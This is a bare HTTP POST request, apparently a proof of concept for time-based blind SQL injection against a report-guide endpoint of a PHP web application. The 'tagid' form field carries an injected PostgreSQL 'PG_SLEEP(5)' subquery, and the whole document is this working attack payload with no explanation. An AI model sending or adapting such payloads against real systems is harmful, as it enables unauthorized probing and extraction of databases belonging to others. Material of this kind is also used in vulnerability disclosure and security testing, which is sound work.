```
POST /ops/index.php?c=Reportguide&a=checkrn HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Connection: close

checkname=123&tagid=123 AND 8475=(SELECT 8475 FROM PG_SLEEP(5))-- BAUh
```

